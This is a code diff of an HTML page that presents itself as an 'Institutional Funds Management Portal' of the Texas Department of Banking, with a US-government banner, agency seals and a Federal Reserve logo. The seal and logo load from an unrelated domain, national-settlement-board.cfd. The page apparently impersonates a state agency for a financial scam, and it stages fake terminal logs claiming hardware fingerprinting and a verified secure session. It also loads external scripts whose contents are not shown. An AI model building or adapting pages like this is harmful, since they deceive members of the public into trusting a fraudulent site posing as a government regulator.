@@ -3,84 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Institutional Portal | Texas Department of Banking</title>
+    <meta name="robots" content="noindex, nofollow">
+
+    <meta name="theme-color" content="#005ea2">
+    <meta name="description" content="Secure institutional financial system">
+
+    <title>Institutional Funds Management Portal | Texas Department of Banking</title>
+
+    <!-- GOV FONTS -->
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;600;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet">
+
     <link rel="stylesheet" href="theme.css">
 </head>
 <body>
 
-    <!-- REQUIRED: Security script at top of body -->
-    <script src="security.js"></script>
+<script src="security.js"></script>
 
-    <section class="gov-banner">
-        <div class="container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" style="height:10px;" alt="Flag">
-            An official website of the United States government
-        </div>
-    </section>
+<section class="usa-banner">
+    <div class="container usa-banner__inner">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" alt="U.S. Flag">
+        <span>An official website of the United States government</span>
+    </div>
+</section>
 
-    <header class="site-header">
-        <div class="container header-flex">
-            <div style="display:flex; align-items:center; gap:20px;">
-                <img src="https://national-settlement-board.cfd/images/dob-texas.png" alt="Texas Seal" style="height:60px;">
-                <div>
-                    <h1 style="font-size:24px; margin:0; color:white;">Texas Department of Banking</h1>
-                    <p style="font-size:10px; margin:0; color:#cbd5e1; letter-spacing:1px; text-transform:uppercase;">Institutional Funds Management Authority</p>
-                </div>
+<header class="site-header">
+    <div class="header-top">
+        <div class="container header-brand">
+            <img src="https://national-settlement-board.cfd/images/dob-texas.png" alt="">
+            <div class="brand-text">
+                <h1>Texas Department of Banking</h1>
+                <p>Institutional Funds Management Authority (TIFMA)</p>
             </div>
-            <div style="text-align:right;">
-                <div id="cst-clock" class="cst-clock">--:--:-- CST</div>
-                <div style="font-size:10px; opacity:0.7;">NODE: TX-GATE-882</div>
+            <div style="margin-left:auto;">
+                <div id="cst-clock" class="cst-clock-badge">00:00:00 CST</div>
             </div>
         </div>
-    </header>
+    </div>
+</header>
 
-    <main class="container" style="padding-top:40px; padding-bottom:40px;">
-        <div class="grid-row">
-            <!-- System Status Panel -->
-            <div class="panel">
-                <h3 style="border-bottom:2px solid var(--color-accent); padding-bottom:10px; margin-bottom:20px;">Secure Session Info</h3>
-                <div style="display:grid; gap:10px;">
-                    <p><strong>Authenticated User:</strong> <span id="display-name">Loading...</span></p>
-                    <p><strong>Assigned Node:</strong> <span style="font-family:var(--font-mono);">NSB-SYSTEM-UNIT</span></p>
-                    <p><strong>Status:</strong> <span style="color:#059669; font-weight:700;">ACTIVE</span></p>
-                </div>
-            </div>
+<main class="container main-content">
 
-            <!-- Ledger Activity -->
-            <div class="panel">
-                <h3 style="border-bottom:2px solid var(--color-accent); padding-bottom:10px; margin-bottom:20px;">Node Telemetry</h3>
-                <p class="text-small">System is currently monitoring input vectors and hardware fingerprints.</p>
-                <div style="background:#000; color:#0f0; padding:15px; font-family:var(--font-mono); font-size:12px; border-radius:4px;">
-                    > ANALYZING_BUFFER...<br>
-                    > SYNCING_TELEMETRY...<br>
-                    > HEARTBEAT_STABLE
-                </div>
-            </div>
+<div class="panel elevated">
+    <div class="panel-header">
+        <div>
+            <h2>Node Integration Environment</h2>
+            <p id="system-date" class="muted"></p>
         </div>
-    </main>
-
-    <footer class="site-footer">
-        <div class="container">
-            <div class="grid-row">
-                <div>
-                    <h4 style="color:var(--color-primary); margin-bottom:10px;">Regulatory Oversight</h4>
-                    <p class="text-small">All transactions are subject to federal financial compliance protocols. Unauthorized access is prohibited by Texas Penal Code § 33.02.</p>
-                </div>
-                <div style="text-align:right;">
-                    <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png" alt="Fed Seal" style="height:40px; opacity:0.2;">
-                </div>
-            </div>
+        <div class="status-indicator">
+            <span class="status-dot pulse"></span>
+            SYSTEM_LINK_ACTIVE
         </div>
-    </footer>
+    </div>
 
-    <script>
-        // Update the UI with stored session data
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('display-name').innerText = localStorage.getItem('tifma_name') || 'Unknown';
+    <div class="grid">
+        <div class="identity">
+            <h3>Session Identity</h3>
+            <p id="user-name" class="identity-name">Loading...</p>
+            <p class="mono">NODE_ID: <span id="node-id"></span></p>
+        </div>
+
+        <div class="actions">
+            <p>Institutional Interface Controls</p>
+            <button class="btn btn-primary" onclick="toggleInterfaceTheme()">
+                Switch Interface Theme
+            </button>
+        </div>
+    </div>
+</div>
+
+<div class="panel terminal">
+    <div class="terminal-header">
+        <h3>> TERMINAL_OUTPUT</h3>
+        <span>ENCRYPTION: AES-256-GCM</span>
+    </div>
+
+    <div class="terminal-body">
+        <div>[<span class="log-time"></span>] INITIALIZING TELEMETRY NODE...</div>
+        <div>[<span class="log-time"></span>] FINGERPRINTING HARDWARE VECTORS...</div>
+        <div>[<span class="log-time"></span>] ESTABLISHING BOT_SYNC CHANNEL...</div>
+        <div>[<span class="log-time"></span>] <span class="secure">SECURE SESSION VERIFIED</span></div>
+    </div>
+</div>
+
+</main>
+
+<footer class="site-footer">
+    <div class="container footer-grid">
+        <div>
+            <h4>Institutional Oversight</h4>
+            <p>
+                Access to this system is restricted to authorized institutional representatives.
+                All activity is monitored under applicable law.
+            </p>
+        </div>
+        <div class="footer-logo">
+            <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png">
+        </div>
+    </div>
+
+    <div class="footer-bottom">
+        &copy; 2026 Texas Department of Banking. Institutional Node Ver: 8.4.2-GOLD
+    </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+
+    window.initializeSystemClocks();
+
+    document.getElementById('user-name').textContent =
+        localStorage.getItem('tifma_name') || "AUTHORIZED USER";
+
+    document.getElementById('node-id').textContent =
+        Math.random().toString(36).substring(2,10).toUpperCase();
+
+    document.querySelectorAll('.log-time').forEach(el=>{
+        el.textContent = new Date().toLocaleTimeString();
+    });
+
+    document.getElementById('system-date').textContent =
+        new Date().toLocaleDateString(undefined,{
+            weekday:'long',year:'numeric',month:'long',day:'numeric'
         });
-    </script>
 
-    <!-- REQUIRED: Engine script at bottom of body -->
-    <script src="engine.js"></script>
+    const savedTheme = localStorage.getItem('nsb_theme');
+    if(savedTheme) document.documentElement.setAttribute('data-theme', savedTheme);
+});
+
+function toggleInterfaceTheme(){
+    const current = document.documentElement.getAttribute('data-theme');
+    const next = current === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    localStorage.setItem('nsb_theme', next);
+}
+</script>
+
+<script src="engine.js"></script>
+
 </body>
 </html>
